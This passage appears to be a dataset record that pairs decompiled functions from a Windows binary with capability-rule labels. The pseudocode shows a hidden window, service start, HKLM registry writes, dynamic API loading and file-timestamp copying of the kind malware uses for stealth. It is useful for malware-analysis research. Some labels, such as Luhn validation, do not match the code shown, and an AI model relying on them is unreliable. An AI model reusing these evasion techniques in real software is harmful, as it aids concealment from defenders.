            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403c2e) overlaps instruction at (ram,0x00403c2c)\n// \n// WARNING: Removing unreachable block (ram,0x00403c2e)\n\nvoid __cdecl fcn.00403bd0(uint *arg_8h, uint *arg_ch)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    char cVar4;\n    char cVar5;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar3 = &var_67h;\n    for (iVar2 = 0x18; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    cVar5 = '\\0';\n    cVar4 = '\\0';\n    uVar1 = fcn.004039e0(&var_68h, &var_4h);\n    if ((cVar5 == cVar4) && (cVar5 != cVar4)) {\n        *(puVar3 + 3U | &stack0xfffffffc) = uVar1;\n    }\n    fcn.00402960(&var_68h, var_4h, 0x411488, 0x11000);\n    *arg_8h = 0x411488;\n    *arg_ch = 0x11000;\n    return;\n}\n",
        "token_count": 371
    },
    "00403c60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00403c60(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00401af0(*((&stack0xfffffffc & 0xffff0000 | *0x10 - 4) + 8), 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 74
    },
    "00404060": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404074) overlaps instruction at (ram,0x00404071)\n// \n\nvoid __fastcall fcn.00404060(ushort param_1)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t unaff_EBP;\n    bool in_ZF;\n    ushort in_stack_fffffff0;\n    int32_t iVar2;\n    \n    if (((!in_ZF) && (iVar2 = CONCAT22(param_1, in_stack_fffffff0),  in_ZF)) ||\n       (in_EAX = *0x4224cc,  iVar2 = *0x4224cc,  *0x4224cc == 0)) {\n        *(unaff_EBP + 0x602a75c0) = *(unaff_EBP + 0x602a75c0) + (in_EAX & 0x42);\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)(0, iVar2);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x4224cc = 1;\n    }\n    return;\n}\n",
        "token_count": 255
    },
    "00405000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040501e) overlaps instruction at (ram,0x0040501a)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nuint __fastcall fcn.00405000(int32_t param_1, char param_2, int32_t param_3, int32_t param_4)\n\n{\n    uint8_t *puVar1;\n    char *pcVar2;\n    int32_t *piVar3;\n    code *pcVar4;\n    int32_t in_EAX;\n    int32_t iVar5;\n    uchar *puVar6;\n    uchar *puVar7;\n    uint *puVar8;\n    uint *puVar9;\n    uint *unaff_ESI;\n    int32_t iVar10;\n    uint *unaff_EDI;\n    ushort in_ES;\n    bool in_CF;\n    bool in_ZF;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    \n    if ((in_CF || in_ZF) || (!in_CF && !in_ZF)) {\n        iStack16 = param_4;\n        iStack20 = param_3;\n        uStack12 = 0xf01ff;\n        in_EAX = param_4;\n        param_1 = param_3;\n    }\n    piVar3 = unaff_EDI + 1;\n    *unaff_EDI = *unaff_ESI;\n    puVar1 = (&stack0xffffffec | 0x8b) - 1;\n    *puVar1 = *puVar1 | param_1 >> 8;\n    *piVar3 = *piVar3 + param_1;\n    pcVar2 = (&stack0xffffffec | 0x8b) + 0x51;\n    *pcVar2 = *pcVar2 + param_2;\n    pcVar4 = _sym.imp.ADVAPI32.dll_OpenServiceA;\n    puVar6 = in_EAX + -4;\n    *(in_EAX + -4) = 0x405031;\n    iVar5 = (*pcVar4)();\n    if (iVar5 != 0) {\n        *(puVar6 + -4) = piVar3;\n        iVar10 = iVar5;\n        if (-1 < iVar5) {\n            *(puVar6 + -8) = piVar3;\n            if (-1 >= iVar5) {\n                *(puVar6 + -4) = in_ES;\n                iVar10 = iVar5 + -1;\n                *(*(puVar6 + -8) | 0x8be181d0) = iVar5;\n            }\n        }\n        *(puVar6 + -8) = 0;\n        *(puVar6 + -0xc) = 0;\n        *(puVar6 + -0x10) = iVar10;\n        pcVar4 = _sym.imp.ADVAPI32.dll_StartServiceA;\n        puVar7 = puVar6 + -0x14;\n        *(puVar6 + -0x14) = 0x405061;\n        iVar5 = (*pcVar4)();\n        pcVar4 = _sym.imp.KERNEL32.dll_GetLastError;\n        if (iVar5 == 0) {\n            puVar8 = puVar7 + -4;\n            puVar7 = puVar7 + -4;\n            *puVar8 = 0x40506d;\n            iVar5 = (*pcVar4)();\n            if (iVar5 != 0x420) {\n                puVar9 = puVar7 + -4;\n                puVar7 = puVar7 + -4;\n                *puVar9 = 0x405076;\n                iVar5 = (*pcVar4)();\n                if (iVar5 != 0x422) {\n                    *(puVar7 + -4) = iVar10;\n                    pcVar4 = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n                    *(puVar7 + -8) = 0x405086;\n                    (*pcVar4)();\n                    return 0;\n                }\n            }\n        }\n        *(puVar7 + -4) = iVar10;\n        pcVar4 = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n        *(puVar7 + -8) = 0x405098;\n        (*pcVar4)();\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 940
    },
    "00401e00": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401e00(uint arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 64
    },
    "004030c0": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004030c0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x411470, 0x4224ac, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n    return 1;\n}\n",
        "token_count": 139
    },
    "00403490": {
        "rules": [
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004034f7) overlaps instruction at (ram,0x004034f4)\n// \n// WARNING: Removing unreachable block (ram,0x0040356c)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403490(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    char *pcVar7;\n    uint *puVar8;\n    bool bVar9;\n    char lpBuffer;\n    uint var_22fh;\n    uint var_12ch;\n    uint var_28h;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint var_14h;\n    int32_t hFile;\n    \n    lpBuffer = '\\0';\n    var_12ch._0_1_ = 0;\n    puVar5 = &var_22fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    bVar9 = true;\n    puVar5 = &var_12ch + 1;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    hFile = arg_ch;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    if ((!bVar9) && (bVar9)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    uVar3 = 0xffffffff;\n    pcVar6 = &lpBuffer;\n    do {\n        pcVar7 = pcVar6;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar7 = pcVar6 + 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar7;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    puVar5 = pcVar7 + -uVar3;\n    puVar8 = &var_12ch;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar8 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    uVar3 = uVar3 & 3;\n    bVar9 = uVar3 != 0;\n    for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar8 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    if ((bVar9) && (!bVar9)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    uVar3 = 0xffffffff;\n    pcVar6 = 0x411028;\n    do {\n        pcVar7 = pcVar6;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar7 = pcVar6 + 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar7;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    puVar5 = &var_12ch;\n    do {\n        puVar8 = puVar5;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        puVar8 = puVar5 + 1;\n        cVar1 = *puVar5;\n        puVar5 = puVar8;\n    } while (cVar1 != '\\0');\n    puVar5 = pcVar7 + -uVar3;\n    puVar8 = puVar8 + -1;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar8 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar8 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)();\n    if ((arg_ch == -1) && (hFile = fcn.00401e00(arg_8h),  hFile == -1)) {\n        return 0;\n    }\n    iVar2 = hFile;\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(hFile, &lpCreationTime, &lpLastAccessTime, &var_14h);\n    if (arg_ch == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    return 1;\n}\n",
        "token_count": 1280
    },
    "00401640": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint fcn.00401640(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint hModule;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (iVar2 == 0) {\n        return 0;\n    }\n    *0x422498 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    *0x42249c = (*pcVar1)();\n    *0x4224a0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x411120);\n    if (((*0x422498 != 0) && (*0x42249c != 0)) && (*0x4224a0 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 203
    },
    "00403c90": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00403c90(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4111b8, 0x4111fc, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 81
    }
}